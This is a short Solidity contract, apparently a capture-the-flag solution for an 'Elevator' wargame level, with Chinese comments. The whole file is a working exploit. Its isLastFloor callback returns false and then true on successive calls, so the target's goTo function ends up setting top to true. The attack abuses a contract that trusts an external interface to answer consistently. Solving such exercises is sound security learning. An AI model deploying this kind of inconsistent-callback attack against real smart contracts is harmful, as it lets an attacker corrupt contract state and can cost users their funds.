// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function goTo(uint256) external;
    function top() external view returns (bool);
    function getCurrentFloor() external view returns (uint256);
}

contract ElevatorAttack is Building {
    IElevator public elevator;
    bool public toggle = false;

    function setElevator(address _elevator) public {
        elevator = IElevator(_elevator);
    }

    function attack() public {
        // 调用goTo函数，触发漏洞
        // 由于Building接口中的isLastFloor函数可以被恶意实现，我们可以利用这一点
        elevator.goTo(10);
    }

    // 实现Building接口的isLastFloor函数
    function isLastFloor(uint256) external override returns (bool) {
        // 第一次返回false（让Elevator进入if分支），第二次返回true（把top设为true）
        bool current = toggle;
        toggle = !toggle;
        return current;
    }
}